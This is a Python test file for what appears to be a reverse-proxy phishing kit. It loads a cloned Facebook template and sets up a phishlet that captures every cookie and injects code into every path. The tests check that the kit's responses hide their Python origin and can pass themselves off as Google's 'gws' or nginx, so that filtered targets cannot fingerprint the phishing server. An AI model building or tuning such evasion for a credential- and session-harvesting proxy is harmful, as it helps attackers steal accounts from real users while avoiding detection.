"""Header hygiene: our responses must not advertise that they are a script.

BaseHTTPRequestHandler sends `Server: BaseHTTP/0.6 Python/3.x` on every response,
and the proxy used to add its own Server and Date on top of the upstream's, so a
filtered target saw two of each plus a trailing-space "nginx ". All of it was
observed live before the fix; this suite pins the corrected behaviour.
"""
import http.client
import http.server
import os
import socketserver
import sys
import threading
import time

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import server as srv  # noqa: E402

pytestmark = pytest.mark.integration

TEMPLATES = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                         "templates")


def free_port():
    import socket
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def _serve(**kw):
    port = free_port()
    site = os.path.join(TEMPLATES, "01_facebook")
    if not os.path.isdir(site):
        pytest.skip("templates not generated")
    httpd, _ = srv.serve(TEMPLATES, site, port, os.path.join("/tmp", "hdr.db"),
                         geo_provider="off", **kw)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    time.sleep(0.25)
    return httpd, port


def _headers(port, path="/"):
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    conn.request("GET", path, headers={"Host": "127.0.0.1"})
    r = conn.getresponse()
    r.read()
    hs = r.getheaders()
    conn.close()
    return hs


def _values(headers, name):
    low = name.lower()
    return [v for k, v in headers if k.lower() == low]


class TestStaticServerHeaders:

    def test_no_python_banner(self):
        httpd, port = _serve()
        try:
            hs = _headers(port)
            server = " ".join(_values(hs, "Server"))
            assert server, hs
            assert "python" not in server.lower(), server
            assert "basehttp" not in server.lower(), server
        finally:
            httpd.shutdown()

    def test_exactly_one_server_and_one_date(self):
        httpd, port = _serve()
        try:
            hs = _headers(port)
            assert len(_values(hs, "Server")) == 1, hs
            assert len(_values(hs, "Date")) == 1, hs
        finally:
            httpd.shutdown()

    def test_a_custom_server_header_is_used_verbatim(self):
        httpd, port = _serve(server_header="gws")
        try:
            assert _values(_headers(port), "Server") == ["gws"]
        finally:
            httpd.shutdown()

    def test_an_empty_server_header_omits_it(self):
        httpd, port = _serve(server_header="")
        try:
            hs = _headers(port)
            assert _values(hs, "Server") == [], hs
            assert len(_values(hs, "Date")) == 1, hs
        finally:
            httpd.shutdown()


class UpstreamWithoutServer(http.server.BaseHTTPRequestHandler):
    """A target that labels itself with nothing at all."""
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def version_string(self):
        return ""                                  # no Server value

    def do_GET(self):
        body = b"<html><body><form><input name=login></form></body></html>"
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


class UpstreamWithServer(UpstreamWithoutServer):
    def version_string(self):
        return "gunicorn/19.9.0"                    # the target labels itself


class TestProxyHeaders:

    @staticmethod
    def _proxy(upstream_cls, server_header="nginx"):
        from core.phishlet import Phishlet, ProxyHost
        from core.proxy import ProxyEngine, serve_proxy
        up = socketserver.ThreadingTCPServer(("127.0.0.1", 0), upstream_cls)
        up.daemon_threads = True
        up_port = up.server_address[1]
        threading.Thread(target=up.serve_forever, daemon=True).start()
        ph = Phishlet(capture_cookies=["*"], inject_paths=[".*"], verify_tls=False)
        ph.proxy_hosts = [ProxyHost(domain="127.0.0.1", orig_sub="", phish_sub="",
                                    scheme="http", port=up_port, is_landing=True)]
        engine = ProxyEngine(ph, db=None, geo_provider="off", logger=lambda *a: None,
                             server_header=server_header)
        port = free_port()
        httpd = serve_proxy(engine, port, campaign="hdr")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.25)
        return up, httpd, port

    def test_the_upstreams_own_server_header_is_relayed_once(self):
        up, httpd, port = self._proxy(UpstreamWithServer)
        try:
            hs = _headers(port)
            assert _values(hs, "Server") == ["gunicorn/19.9.0"], hs
            assert len(_values(hs, "Date")) == 1, hs
        finally:
            httpd.shutdown()
            up.shutdown()

    def test_the_configured_header_is_the_fallback(self):
        up, httpd, port = self._proxy(UpstreamWithoutServer, server_header="nginx")
        try:
            hs = _headers(port)
            assert _values(hs, "Server") == ["nginx"], hs
            assert len(_values(hs, "Date")) == 1, hs
        finally:
            httpd.shutdown()
            up.shutdown()

    def test_an_empty_fallback_still_yields_one_date(self):
        up, httpd, port = self._proxy(UpstreamWithoutServer, server_header="")
        try:
            hs = _headers(port)
            assert _values(hs, "Server") == [], hs
            assert len(_values(hs, "Date")) == 1, hs
        finally:
            httpd.shutdown()
            up.shutdown()

    def test_we_never_add_a_python_banner(self):
        up, httpd, port = self._proxy(UpstreamWithoutServer)
        try:
            server = " ".join(_values(_headers(port), "Server")).lower()
            assert "python" not in server and "basehttp" not in server, server
        finally:
            httpd.shutdown()
            up.shutdown()
